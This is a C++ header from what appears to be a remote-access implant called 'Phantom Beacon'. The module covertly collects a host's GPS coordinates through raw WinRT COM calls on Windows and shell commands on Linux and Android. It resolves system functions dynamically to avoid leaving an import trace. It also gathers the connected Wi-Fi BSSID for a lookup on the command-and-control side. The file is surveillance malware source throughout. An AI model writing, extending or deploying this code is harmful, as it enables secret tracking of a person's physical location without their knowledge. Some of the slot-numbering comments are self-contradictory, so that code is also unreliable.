#pragma once
// ============================================================================
//  gps.h — Phantom Beacon GPS Location Module (Cross-Platform)
//  ─────────────────────────────────────────────────────────
//  Windows: WinRT Windows.Devices.Geolocation.Geolocator activated through
//           raw COM (RoGetActivationFactory) — NO WinRT headers, no CRT.
//           Returns REAL lat/lon when location services are on; falls back
//           to connected-WiFi BSSID diagnostics when they are not.
//  Linux:   GPSD daemon / network location
//  Android: dumpsys location services
// ============================================================================

#include "media_utils.h"
#include <string>
#include <cstdint>

#ifdef _WIN32

#include <windows.h>
#include <objbase.h>
#include <hstring.h>

namespace media_gps {

// ── minimal WinRT plumbing (flat C ABI only) ────────────────────────────────
namespace wrlite {

// dynamic WinRT string helpers (combase.dll — no static import trace)

inline void** winrt_funcs() {
    static void** fns = nullptr;
    if (fns) return fns;
    HMODULE combase = LoadLibraryA("combase.dll");
    if (!combase) return nullptr;
    static void* table[3] = {nullptr, nullptr, nullptr};
    table[0] = (void*)GetProcAddress(combase, "WindowsCreateString");
    table[1] = (void*)GetProcAddress(combase, "WindowsDeleteString");
    table[2] = (void*)GetProcAddress(combase, "RoGetActivationFactory");
    fns = table;
    return fns;
}

typedef long (__stdcall *FnCreateStr)(const wchar_t*, UINT32, HSTRING*);
typedef long (__stdcall *FnDelStr)(HSTRING);
typedef long (__stdcall *FnRoGet)(HSTRING, INT32, void**);

inline bool create_string_w(const wchar_t* wide, HSTRING* out) {
    void** fns = winrt_funcs();
    if (!fns || !fns[0]) return false;
    return SUCCEEDED(((FnCreateStr)fns[0])(wide, (UINT32)wcslen(wide), out));
}

inline void delete_string(HSTRING h) {
    void** fns = winrt_funcs();
    if (fns && fns[1] && h) ((FnDelStr)fns[1])(h);
}

// RoGetActivationFactory — RAW enum 0x1 = base+threaded
inline void* ro_activation_factory(const wchar_t* classId) {
    void** fns = winrt_funcs();
    if (!fns || !fns[2]) return nullptr;
    HSTRING h = nullptr;
    if (!create_string_w(classId, &h)) return nullptr;
    void* factory = nullptr;
    long hr = ((FnRoGet)fns[2])(h, 0x1, &factory);
    delete_string(h);
    if (FAILED(hr)) return nullptr;
    return factory;
}

// IUnknown/IInspectable dispatch helpers
inline void* vtbl_slot(void* obj, int slot) {
    void** vtbl = *(void***)obj;
    return vtbl[slot];
}

typedef long (__stdcall* QueryIntfFn)(void*, void*, void**);

struct GeopositionBasic {
    double lat; double lon; double acc; long long ts; INT32 src; INT32 sat;
};

inline bool get_position(GeopositionBasic& out, int timeout_ms) {
    // IGeolocatorStatics: RequestAccessAsync=6, GetGeopositionAsync(default)=7
    void* statics = ro_activation_factory(
        L"Windows.Devices.Geolocation.Geolocator");
    if (!statics) return false;
    // slot 7 on IGeolocatorStatics = GetGeopositionAsync() (no args)
    typedef long (__stdcall* GetPosFn)(void*, void**);
    auto pGetPos = (GetPosFn)vtbl_slot(statics, 7);
    if (!pGetPos) return false;
    void* op = nullptr;
    if (FAILED(pGetPos(statics, &op)) || !op) return false;

    // IAsyncOperation<Geoposition> inherits IAsyncInfo:
    //   slots: (IUnknown 0-2) (IInspectable 3-5) Status=6 Id=7 ErrorCode=8
    //          Cancel=9 Close=10 GetResults=11
    typedef long (__stdcall* GetStatusFn)(void*, INT32*);
    typedef long (__stdcall* GetResultsFn)(void*, void**);
    auto pStatus = (GetStatusFn)vtbl_slot(op, 6);
    auto pResults = (GetResultsFn)vtbl_slot(op, 11);
    if (!pStatus || !pResults) return false;

    int waited = 0;
    INT32 status = 0;
    // 0=Started 1=Completed 2=Canceled 3=Error
    while (waited < timeout_ms) {
        if (FAILED(pStatus(op, &status))) return false;
        if (status != 0) break;
        Sleep(200);
        waited += 200;
    }
    if (status != 1) return false;   // not Completed

    void* pos = nullptr;
    if (FAILED(pResults(op, &pos)) || !pos) return false;

    // IGeoposition: (IUnknown 0-2)(IInspectable 3-5) Coordinate=6 CivicAddress=7
    typedef long (__stdcall* GetCoordFn)(void*, void**);
    auto pCoord = (GetCoordFn)vtbl_slot(pos, 6);
    if (!pCoord) return false;
    void* coord = nullptr;
    if (FAILED(pCoord(pos, &coord)) || !coord) return false;

    // IBasicGeoposition struct is a flat value struct — but IGeoposition
    // wraps it; read through IGeoposition2/BasicGeoposition property slots:
    // IGeoposition (after IInspectable): Latitude=6? No — Coordinate first.
    // Use ICoordinate (Geocoordinate): (Unk 0-2)(Insp 3-5)
    //   PositionSource=6, Latitude=7, Longitude=8, Accuracy=9 ...
    // Property getters return HRESULT and write through a pointer arg.
    typedef long (__stdcall* GetDblFn)(void*, double*);
    auto pLat = (GetDblFn)vtbl_slot(coord, 7);
    auto pLon = (GetDblFn)vtbl_slot(coord, 8);
    auto pAcc = (GetDblFn)vtbl_slot(coord, 9);
    typedef long (__stdcall* GetIntFn)(void*, INT32*);
    auto pSrc = (GetIntFn)vtbl_slot(coord, 6);
    if (!pLat || !pLon) return false;
    double lat = 0, lon = 0, acc = 0;
    INT32 src = -1;
    if (FAILED(pLat(coord, &lat)) || FAILED(pLon(coord, &lon))) return false;
    if (pAcc) pAcc(coord, &acc);
    if (pSrc) pSrc(coord, &src);
    out = {lat, lon, acc, 0, src, 0};
    return lat != 0.0 || lon != 0.0;
}

} // namespace wrlite

inline std::string get_gps_info() {
    std::string out;

    wrlite::GeopositionBasic pos{};
    if (wrlite::get_position(pos, 15000)) {
        char buf[256];
        snprintf(buf, sizeof(buf),
                 "GPS: lat=%.6f lon=%.6f acc=%.0fm source=%d\n",
                 pos.lat, pos.lon, pos.acc, pos.src);
        out += buf;
        out += "MAPS: https://www.google.com/maps?q=" +
               std::to_string(pos.lat).substr(0, 10) + "," +
               std::to_string(pos.lon).substr(0, 10) + "\n";
        return out;
    }

    // Fallback diagnostics: why location is unavailable (permission denied,
    // service off, desktop without radios) + the connected-AP BSSID for the
    // C2-side Apple-WLOC lookup (same data `wlan-locate` uses).
    out += "GPS: WinRT location unavailable (permission or service off)\n";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Services\\WwanSvc", 0,
                      KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD type = 0, size = sizeof(DWORD), enabled = 0;
        if (RegQueryValueExA(hKey, "Start", nullptr, &type,
                             (LPBYTE)&enabled, &size) == ERROR_SUCCESS) {
            out += "WWAN Service: " + std::to_string(enabled) + "\n";
        }
        RegCloseKey(hKey);
    }
    std::string wifi = media_utils::exec_cmd("netsh wlan show interfaces 2>nul");
    size_t p = wifi.find("BSSID");
    if (p != std::string::npos) {
        size_t end = wifi.find('\n', p);
        out += "ConnectedAP: " + wifi.substr(p, end - p) + "\n";
        out += "HINT: run 'wlan-locate' for BSSID triangulation\n";
    }
    return out;
}

} // namespace media_gps

#else  // !WIN32

namespace media_gps {

inline std::string get_gps_info() {
#if defined(__ANDROID__) || defined(ANDROID)
    std::string out = "GPS: Android platform\n";
    std::string loc = media_utils::exec_cmd(
        "dumpsys location 2>/dev/null | grep -E 'lastFix|latitude|longitude|altitude'");
    if (!loc.empty()) out += loc;
    std::string provider = media_utils::exec_cmd(
        "dumpsys location providers 2>/dev/null | grep -E 'GPS|network'");
    if (!provider.empty()) out += "Providers:\n" + provider;
    return out;
#else
    std::string out = "GPS: Linux platform\n";
    std::string gpsd = media_utils::exec_cmd("gpspipe -w -n 1 2>/dev/null");
    if (!gpsd.empty()) out += "GPSD: " + gpsd + "\n";
    if (media_utils::file_exists("/dev/gps0")) {
        std::string dev = media_utils::exec_cmd("head -n 5 /dev/gps0 2>/dev/null");
        if (!dev.empty()) out += "GPS Device:\n" + dev;
    }
    std::string geo = media_utils::exec_cmd("nmcli -p general 2>/dev/null");
    if (!geo.empty()) out += "NetworkManager:\n" + geo + "\n";
    out += "GPS: No location source available (GPSD, serial GPS, or geoclue required)\n";
    return out;
#endif
}

} // namespace media_gps

#endif // _WIN32
